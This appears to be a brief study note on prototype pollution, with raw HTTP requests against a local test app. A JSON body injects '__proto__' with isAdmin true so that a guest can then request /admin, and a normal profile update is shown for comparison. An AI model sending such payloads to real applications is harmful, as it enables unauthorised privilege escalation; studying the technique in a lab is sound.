Prototype Pollution

https://chatgpt.com/c/67b33e1d-ff00-8007-97a3-313a08ec0e6a


POST /update-profile HTTP/1.1
Host: localhost:3000
Cookie: username=guest
Content-Type: application/json
Content-Length: 42

{
    "__proto__": { "isAdmin": true }
}


then:

GET /admin HTTP/1.1
Cookie: username=guest
Host: localhost:3000

normal request to update profile would be:

POST /update-profile HTTP/1.1
Host: localhost:3000
Cookie: username=guest
Content-Type: application/json
Content-Length: 88

{"password": "newPassword", "role": "admin", "profile": "Updated profile descriptioasd"}